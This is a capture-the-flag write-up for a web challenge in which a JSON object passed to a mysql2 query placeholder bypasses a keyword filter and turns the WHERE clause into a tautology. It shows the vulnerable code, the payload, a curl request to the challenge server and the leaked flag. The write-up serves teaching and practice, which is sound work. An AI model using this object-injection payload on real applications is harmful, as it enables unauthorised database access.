---
layout: layouts/post.njk
title: "NoSQL"
date: 2026-01-05
category: Web Exploitation
difficulty: Easy
tags: [ETJ2025]
description: "Bypass mysql2 placeholder logic with a JSON object trick."
---

## Vulnerability
The server uses the `mysql2` library. When this library receives a **JSON object** instead of a string for a placeholder (`?`), it automatically converts it into SQL column/value pairs.
```js
let { flag } = req.body;
let sql = 'SELECT flag FROM flags WHERE flag = ? LIMIT 1';
let [rows] = await db.query(sql, [flag]);
```

## Bypass
The server tries to block "SQL Injection" by checking if your input contains words like `SELECT`, `OR`, or symbols like `'`.

However, the filter checks a **stringified** version of your input. If we send a nested object, we can avoid using any forbidden words or quotes while still manipulating the SQL logic.

## Payload
```js
{
  "flag": { "flag": 1 }
}
```

The database query is transformed from a simple comparison into a **tautology** (something that is always true):
- **Logical result:** `WHERE flag = (flag = 1)`
- **Why it works:** In MySQL, comparing a column to itself (`flag = flag`) returns `1` (true). This makes the condition valid for the first row it finds, revealing the flag.

### Request
```sh
curl -X POST https://nosql.ctf.cybertalent.no/validate -H "Content-Type: application/json" -d '{"flag": {"flag": 1}}'
```
### Response
```sh
{"ok":true,"message":"28696be6f82e96166a2177d976d32cb9 is a valid flag!"}%
```
